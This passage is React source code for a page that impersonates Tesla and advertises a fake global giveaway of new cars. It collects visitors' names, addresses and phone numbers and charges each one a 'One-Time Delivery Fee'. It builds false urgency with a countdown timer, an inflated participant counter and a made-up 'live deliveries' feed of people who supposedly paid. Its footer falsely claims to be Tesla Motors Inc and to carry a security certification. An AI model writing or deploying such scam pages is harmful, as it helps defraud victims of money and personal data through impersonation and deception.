                  Enter your name, physical home delivery address, and active mobile contact information so Tesla dispatch specialists can process reservation credentials and ship your car directly.
                </p>
              </div>

              <div className="bg-neutral-900/80 border border-white/5 p-8 rounded-3xl relative overflow-hidden group">
                <div className="absolute top-0 right-0 h-24 w-24 bg-red-600/5 text-neutral-850 font-black text-6xl flex items-center justify-center font-display leading-none select-none opacity-20 group-hover:scale-105 transition-transform">
                  02
                </div>
                <h3 className="text-white text-lg font-bold uppercase tracking-wider mb-3">Choose Your Tesla Car</h3>
                <p className="text-neutral-400 text-sm leading-relaxed">
                  Select your preferred high-performance Tesla model: Model 3, Model Y, Model S, or Model X — all brand new 2024-2025 editions equipped with full autopilot suites.
                </p>
              </div>
            </div>

          </div>
        </section>


        {/* ==================================================== */}
        {/* SECTION 5: CHOOSE YOUR TESLA GRID INVENTORY AREA     */}
        {/* ==================================================== */}
        <section id="participate-section" className="bg-neutral-950 py-20 px-6 md:px-12 border-b border-white/5 scroll-mt-24">
          <div className="max-w-7xl mx-auto space-y-12">
            
            {/* Center Banner Headers */}
            <div className="text-center space-y-4">
              <span className="inline-block bg-red-600/10 border border-red-500/30 text-red-500 text-xs font-bold tracking-[0.25em] uppercase px-5 py-2 rounded font-mono">
                Official Tesla Global Giveaway
              </span>
              <h2 className="text-3xl sm:text-4xl lg:text-5xl font-display font-black uppercase tracking-wider">
                Choose Your <span className="text-red-600">Tesla Electric Car</span>
              </h2>
              <p className="text-neutral-400 text-xs sm:text-sm max-w-2xl mx-auto font-sans leading-relaxed">
                Tesla is gifting brand new electric vehicles to participants worldwide. Check live availability lists below and submit your specifications configurations.
              </p>
            </div>

            {/* Live countdown timer bar */}
            <div className="max-w-xl mx-auto bg-neutral-900 border border-white/10 rounded-2xl p-5 md:p-6 text-center space-y-4 shadow-xl">
              <div className="text-[10px] md:text-xs font-mono uppercase tracking-[0.2em] text-neutral-400 flex items-center justify-center space-x-2">
                <span className="w-1.5 h-1.5 bg-red-600 rounded-full animate-ping"></span>
                <span>Limited Configurations Available • Event Ends In:</span>
              </div>
              
              <div className="grid grid-cols-3 gap-3 max-w-xs mx-auto font-sans text-white select-none">
                <div className="bg-neutral-950 border border-white/5 rounded-xl py-3 flex flex-col items-center">
                  <span className="text-2xl sm:text-3xl font-black font-mono tracking-tight text-red-500">
                    {String(hours).padStart(2, '0')}
                  </span>
                  <span className="text-[8px] uppercase tracking-wider text-neutral-400 mt-1">Hours</span>
                </div>
                <div className="bg-neutral-950 border border-white/5 rounded-xl py-3 flex flex-col items-center">
                  <span className="text-2xl sm:text-3xl font-black font-mono tracking-tight text-red-500">
                    {String(minutes).padStart(2, '0')}
                  </span>
                  <span className="text-[8px] uppercase tracking-wider text-neutral-400 mt-1">Mins</span>
                </div>
                <div className="bg-neutral-950 border border-white/5 rounded-xl py-3 flex flex-col items-center">
                  <span className="text-2xl sm:text-3xl font-black font-mono tracking-tight text-red-500 animate-pulse">
                    {String(seconds).padStart(2, '0')}
                  </span>
                  <span className="text-[8px] uppercase tracking-wider text-neutral-400 mt-1">Secs</span>
                </div>
              </div>

              <p className="text-[10px] sm:text-xs font-mono text-neutral-500 uppercase tracking-widest pt-1 border-t border-white/5">
                Current queue load: <strong className="text-white">{participantsCount + 412} active connections</strong> • Global delivery approved
              </p>
            </div>

            {/* Dynamic Cars Listings Area from Database */}
            {cars.filter(c => c.active).length === 0 ? (
              <div className="text-center py-16 bg-neutral-90); border border-white/5 rounded-3xl">
                <p className="text-neutral-400 text-sm">Synchronizing vehicle lists...</p>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 font-sans">
                {cars.filter(c => c.active).map((car) => {
                  const fee = getDeliveryFee(car.price);
                  const bgImg = car.images && car.images.length > 0
                    ? car.images[0]
                    : "https://images.unsplash.com/photo-1563720223185-11003d516935?auto=format&fit=crop&w=400&q=80";

                  return (
                    <div 
                      key={car.id} 
                      className="bg-neutral-900 border border-white/5 hover:border-red-600/30 rounded-3xl overflow-hidden flex flex-col justify-between group transition-all duration-300 shadow-lg"
                    >
                      {/* Thumbnail block with featured ribbon badging */}
                      <div className="aspect-video relative overflow-hidden bg-neutral-950">
                        <img 
                          src={bgImg} 
                          alt={car.name} 
                          referrerPolicy="no-referrer"
                          className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                        />
                        {car.featured && (
                          <div className="absolute top-4 left-4 bg-red-600 text-white font-mono text-[9px] uppercase font-bold py-1 px-2.5 rounded shadow">
                            ★ Top Choice
                          </div>
                        )}
                        <div className="absolute top-4 right-4 bg-neutral-950/80 backdrop-blur-md text-white font-mono text-[9px] uppercase px-2.5 py-1 rounded border border-white/10 tracking-widest">
                          ONE-TIME DISPATCH
                        </div>
                      </div>

                      {/* Info details */}
                      <div className="p-6 space-y-4 flex-grow flex flex-col justify-between">
                        <div>
                          <div className="flex items-baseline justify-between">
                            <h3 className="text-white text-lg font-bold uppercase tracking-wider">{car.name}</h3>
                            <span className="text-xs text-neutral-400 font-mono">({car.year})</span>
                          </div>
                          
                          <p className="text-neutral-400 text-xs mt-2 line-clamp-3 leading-relaxed">
                            {car.description || 'Full performance dual drive electric battery pack with zero delay torque and premium cabin specifications.'}
                          </p>
                        </div>

                        {/* Specs row */}
                        <div className="grid grid-cols-2 gap-3.5 bg-neutral-950/60 p-4 rounded-2xl border border-white/5 text-[11px] font-mono text-neutral-400">
                          <div>
                            <span className="block text-[8px] uppercase text-neutral-500">Range (EPA)</span>
                            <span className="text-white font-medium">{car.specifications?.range || '320 mi'}</span>
                          </div>
                          <div>
                            <span className="block text-[8px] uppercase text-neutral-500">Acceleration</span>
                            <span className="text-white font-medium">{car.specifications?.zeroToSixty || '3.5 s'}</span>
                          </div>
                          <div>
                            <span className="block text-[8px] uppercase text-neutral-500">Top Speed</span>
                            <span className="text-white font-medium">{car.specifications?.topSpeed || '155 mph'}</span>
                          </div>
                          <div>
                            <span className="block text-[8px] uppercase text-neutral-500">Drivetrain</span>
                            <span className="text-white font-medium truncate block max-w-[100px]">{car.specifications?.drivetrain || 'AWD'}</span>
                          </div>
                        </div>

                        {/* Value vs Fee comparisons */}
                        <div className="border-t border-white/5 pt-4 flex items-center justify-between">
                          <div>
                            <span className="text-[10px] text-neutral-500 block uppercase font-mono">Original Est. Value</span>
                            <span className="text-neutral-400 text-xs line-through font-semibold font-sans">
                              ${car.price.toLocaleString()}
                            </span>
                          </div>
                          <div className="text-right">
                            <span className="text-[10px] text-zinc-400 block uppercase font-bold text-neutral-400 font-mono tracking-wider">One-Time Delivery Fee</span>
                            <span className="text-red-500 text-lg font-black font-mono">
                              ${fee}
                            </span>
                          </div>
                        </div>

                        {/* Submit Actions */}
                        <button
                          onClick={() => handleInquireCar(car)}
                          className="w-full bg-red-600 hover:bg-red-700 text-white text-xs font-bold uppercase tracking-[0.15em] py-3.5 rounded-xl transition-all shadow group-hover:scale-[1.01] flex items-center justify-center space-x-1 cursor-pointer"
                        >
                          <span>Claim This Tesla Now</span>
                          <ArrowUpRight className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}

          </div>
        </section>


        {/* ==================================================== */}
        {/* SECTION 6: LIVE DELIVERIES TRANSACTION FEED          */}
        {/* ==================================================== */}
        <section id="transactions-section" className="bg-neutral-950 py-20 px-6 md:px-12 scroll-mt-24">
          <div className="max-w-4xl mx-auto space-y-12 animate-fadeIn">
            
            <div className="text-center space-y-2">
              <span className="text-red-600 text-xs tracking-[0.2em] font-extrabold uppercase font-mono">● LIVE TRANSACTION FEED</span>
              <h2 className="text-2xl sm:text-3xl lg:text-4xl font-display font-bold uppercase tracking-wider">
                Live <span className="text-red-600 font-bold">Deliveries</span>
              </h2>
              <p className="text-neutral-400 text-xs sm:text-sm max-w-xl mx-auto leading-relaxed font-sans">
                Real-time updates of Tesla car deliveries happening right now across the world.
              </p>
            </div>

            {/* Custom transaction log frame */}
            <div className="bg-neutral-900 border border-white/5 rounded-3xl overflow-hidden shadow-2xl font-sans text-xs sm:text-sm">
              <div className="p-4 bg-neutral-950/80 border-b border-white/5 flex items-center justify-between px-6">
                <span className="text-[10px] font-mono text-neutral-400 uppercase tracking-widest">Global Dispatch Log</span>
                <span className="flex items-center space-x-1 text-emerald-500 font-bold font-mono text-[10px]">
                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
                  <span>SYSTEM ONLINE</span>
                </span>
              </div>

              <div className="divide-y divide-white/5">
                {liveDeliveriesLog.map((log, index) => (
                  <div key={index} className="p-4 sm:p-5 px-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 font-sans hover:bg-neutral-900/40 transition-colors">
                    
                    {/* Customer */}
                    <div className="flex items-center space-x-3">
                      <div className="h-8 w-8 bg-red-600/10 text-red-500 rounded-full flex items-center justify-center font-display border border-red-500/10 text-xs flex-shrink-0">
                        {log.name.slice(0, 2)}
                      </div>
                      <div>
                        <div className="flex items-center space-x-1.5">
                          <span className="text-white font-bold">{log.name}</span>
                          <span className="text-[9px] text-neutral-500 uppercase tracking-widest font-mono">({log.country})</span>
                        </div>
                        <span className="text-neutral-400 text-[11px] block mt-0.5">Paid secure global transit</span>
                      </div>
                    </div>

                    {/* Car dispatched state */}
                    <div className="flex items-center space-x-2">
                      <span className="inline-block bg-neutral-950 border border-white/10 text-[10px] sm:text-xs text-white px-3 py-1.5 rounded-full font-mono uppercase tracking-wide">
                        {log.car}
                      </span>
                      <span className="text-emerald-400 font-semibold text-[11px]">{log.status}</span>
                    </div>

                    {/* Price and timestamp */}
                    <div className="sm:text-right font-mono">
                      <div className="text-white font-bold text-xs sm:text-sm">
                        {log.fee} <span className="text-[9px] text-neutral-500 font-normal">paid</span>
                      </div>
                      <span className="text-neutral-500 text-[10px] block mt-0.5">{log.time}</span>
                    </div>

                  </div>
                ))}
              </div>
            </div>

          </div>
        </section>

      </main>

      {/* Modern corporate footer */}
      <footer id="site_footer" className="bg-neutral-950 py-16 px-6 md:px-12 border-t border-white/5 text-xs text-neutral-400 font-sans">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-start md:items-center justify-between gap-8 md:gap-4">
          
          <div className="space-y-3 max-w-sm">
            <h3 className="font-display tracking-[0.2em] uppercase font-bold text-lg text-white">
              {settings.logo || 'TESLA'} MOTORS
            </h3>
            <p className="text-neutral-500 text-xs leading-relaxed capitalize font-sans">
              Accelerating the global transition to clean, fully sustainable electric driving options. Built securely.
            </p>
            <div className="pt-2 flex items-center space-x-2 text-[10px] text-neutral-500 font-mono">
              <ShieldCheck className="w-4 h-4 text-emerald-500" />
              <span>Verified Global Secure Certification 🔒</span>
            </div>
          </div>

          {/* Social connection circles */}
          <div className="flex items-center space-x-4">
            {settings.socialTwitter && (
              <a
                href={settings.socialTwitter}
                target="_blank"
                rel="noreferrer"
                className="p-2.5 bg-neutral-900 border border-white/5 text-neutral-400 hover:text-white rounded-full hover:bg-neutral-800 transition-all shadow"
              >
                <Twitter className="w-4 h-4" />
              </a>
            )}
            {settings.socialInstagram && (
              <a
                href={settings.socialInstagram}
                target="_blank"
                rel="noreferrer"
                className="p-2.5 bg-neutral-900 border border-white/5 text-neutral-400 hover:text-white rounded-full hover:bg-neutral-800 transition-all shadow"
              >
                <Instagram className="w-4 h-4" />
              </a>
            )}
            {settings.socialYoutube && (
              <a
                href={settings.socialYoutube}
                target="_blank"
                rel="noreferrer"
                className="p-2.5 bg-neutral-900 border border-white/5 text-neutral-400 hover:text-white rounded-full hover:bg-neutral-800 transition-all shadow"
              >
                <Youtube className="w-4 h-4" />
              </a>
            )}
            {settings.socialFacebook && (
              <a
                href={settings.socialFacebook}
                target="_blank"
                rel="noreferrer"
                className="p-2.5 bg-neutral-900 border border-white/5 text-neutral-400 hover:text-white rounded-full hover:bg-neutral-800 transition-all shadow"
              >
                <Facebook className="w-4 h-4" />
              </a>
            )}
          </div>

          {/* Contact Details */}
          <div className="space-y-2 text-left md:text-right font-mono text-zinc-400">
            <div className="flex items-center md:justify-end space-x-2">
              <Mail className="w-3.5 h-3.5 text-neutral-600" />
              <span>{settings.contactEmail || 'sales@tesla-inventory.com'}</span>
            </div>
            <div className="flex items-center md:justify-end space-x-2">
              <Phone className="w-3.5 h-3.5 text-neutral-600" />
              <span>{settings.contactPhone || '+1 (800) 555-0199'}</span>
            </div>
            <div className="flex items-center md:justify-end space-x-2 text-neutral-500">
              <MapPin className="w-3.5 h-3.5 text-neutral-700" />
              <span>{settings.contactAddress || 'Palo Alto, CA'}</span>
            </div>
          </div>
        </div>

        <div className="border-t border-white/5 mt-12 pt-8 text-center text-[10px] text-neutral-600 uppercase tracking-widest font-mono">
          <p>© {new Date().getFullYear()} {settings.logo || 'TESLA'} MOTORS INC. SECURE SYSTEM CERTIFIED.</p>
        </div>
      </footer>

      {/* Automatic Slide-In Customer Toast Notification Popup */}
      <NotificationToast />

      {/* Digital reservation inquiry form overlay */}
      <InquiryModal
        isOpen={isBookingOpen}
        onClose={() => setIsBookingOpen(false)}
        selectedCar={selectedCar}
        settings={settings}
        availableCars={cars.filter(c => c.active)}
      />

    </div>
  );
}
